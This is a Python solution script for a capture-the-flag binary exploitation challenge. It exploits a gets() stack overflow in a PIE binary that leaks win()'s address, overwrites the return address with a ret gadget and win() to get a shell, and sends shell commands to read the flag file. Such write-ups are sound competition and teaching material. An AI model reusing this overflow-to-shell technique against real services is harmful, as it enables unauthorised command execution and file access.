#!/usr/bin/env python3
"""
LIT CTF 2026 — pwn — "key"   (nc 136.115.87.65 31776)

"because bread tastes better than key"

PIE binary, but main() hands us the leak itself:
    printf("Key: %p", &win);          // leaks win()'s runtime address ("the key")
    *(rbp+8) = "bread";               // pre-fills the return slot with "bread" (joke)
    gets(buf);                        // buf = [rbp-0x20], UNBOUNDED overflow
win() = system("/bin/sh").

Offset buf -> return address = 0x20 + 8 = 40. We already know win's address from the
leak, so just overwrite the return with win. A single `ret` gadget (win+0x19, the bare
`ret`) fixes 16-byte stack alignment so system()'s movaps doesn't crash.
"""
import socket, time, re, struct

HOST, PORT = "136.115.87.65", 31776

def attempt():
    s = socket.socket(); s.settimeout(8); s.connect((HOST, PORT))
    buf = b""
    try:
        while b"\n" not in buf:                 # read "Key: 0x....\n"
            c = s.recv(1)
            if not c: break
            buf += c
    except socket.timeout:
        pass
    m = re.search(rb"0x[0-9a-fA-F]+", buf)
    if not m:
        s.close(); return None
    win = int(m.group(), 16)
    ret = win + 0x19                              # 0x11a2 = bare `ret` (alignment)
    s.sendall(b"A"*40 + struct.pack("<Q", ret) + struct.pack("<Q", win) + b"\n")
    time.sleep(0.5)
    s.sendall(b"cat flag.txt; cat flag; ls\n")
    time.sleep(1.2)
    s.settimeout(2.5); out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    s.close(); return buf + out

def main():
    for _ in range(5):                           # remote's first read is occasionally flaky
        out = attempt()
        if out:
            f = re.search(rb"LITCTF\{[^}]*\}", out)
            if f:
                print("[+]", f.group().decode()); return
        time.sleep(1)
    print("[-] retry")

if __name__ == "__main__":
    main()
